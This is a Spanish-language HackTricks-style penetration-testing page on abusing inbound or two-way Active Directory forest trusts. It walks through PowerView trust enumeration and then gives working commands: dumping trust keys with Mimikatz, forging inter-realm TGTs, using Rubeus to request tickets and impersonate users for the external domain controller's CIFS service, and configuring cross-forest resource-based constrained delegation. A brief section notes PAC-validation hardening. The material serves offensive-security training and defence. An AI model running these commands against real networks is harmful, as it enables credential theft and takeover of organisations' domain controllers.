# Dominio de bosque externo - OneWay (Inbound) o bidireccional

{{#include ../../banners/hacktricks-training.md}}

En este escenario, un dominio externo confía en ti (o ambos confían mutuamente), por lo que puedes obtener algún tipo de acceso a él.

## Enumeración

Primero, necesitas **enumerar** la **confianza**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` te permiten ver rápidamente si las rutas de abuso entre bosques (RBCD, SIDHistory) probablemente funcionen sin prerrequisitos adicionales.

En la enumeración anterior se encontró que el usuario **`crossuser`** está dentro del grupo **`External Admins`** que tiene **acceso de administrador** dentro del **DC del dominio externo**.

## Acceso inicial

Si no pudiste encontrar ningún acceso **especial** de tu usuario en el otro dominio, aún puedes volver a la AD Methodology y tratar de **privesc from an unprivileged user** (cosas como kerberoasting, por ejemplo):

Puedes usar las **Powerview functions** para **enumerar** el **otro dominio** usando el parámetro `-Domain` como en:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### Inicio de sesión

Usando un método regular con las credenciales de los usuarios que tienen acceso al dominio externo, deberías poder acceder a:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Abuso de SID History

También se puede abusar de [**SID History**](sid-history-injection.md) a través de un forest trust.

Si un usuario es migrado **de un forest a otro** y **SID Filtering no está habilitado**, se vuelve posible **añadir un SID del otro forest**, y este **SID** será **añadido** al **token del usuario** al autenticarse **a través del trust**.

> [!WARNING]
> Como recordatorio, puedes obtener la clave de firma con
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Se podría **firmar con** la clave **de confianza** un **TGT que suplante** al usuario del dominio actual.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Ruta completa suplantando al usuario
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD when you control a machine account in the trusting forest (no SID filtering / selective auth)

Si tu foreign principal (FSP) te coloca en un grupo que puede escribir objetos de equipo en el trusting forest (p. ej., `Account Operators`, custom provisioning group), puedes configurar **Resource-Based Constrained Delegation** en un host objetivo de ese forest y suplantar a cualquier usuario allí:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Esto solo funciona cuando **SelectiveAuthentication is disabled** y **SID filtering** no elimina tu SID de control. Es una vía lateral rápida que evita la falsificación de SIDHistory y a menudo se pasa por alto en las revisiones de confianza.

### Endurecimiento de la validación PAC

Las actualizaciones de validación de firma PAC para **CVE-2024-26248**/**CVE-2024-29056** añaden la aplicación de firmas en los tickets entre bosques. En **Compatibility mode**, las rutas PAC/SIDHistory/S4U forjadas entre reinos pueden seguir funcionando en DCs sin parchear. En **Enforcement mode**, los datos PAC sin firmar o manipulados que cruzan una relación de confianza entre bosques son rechazados a menos que también poseas la clave de confianza del bosque de destino. Las sobrescrituras del registro (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) pueden debilitar esto mientras sigan disponibles.

## Referencias

- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
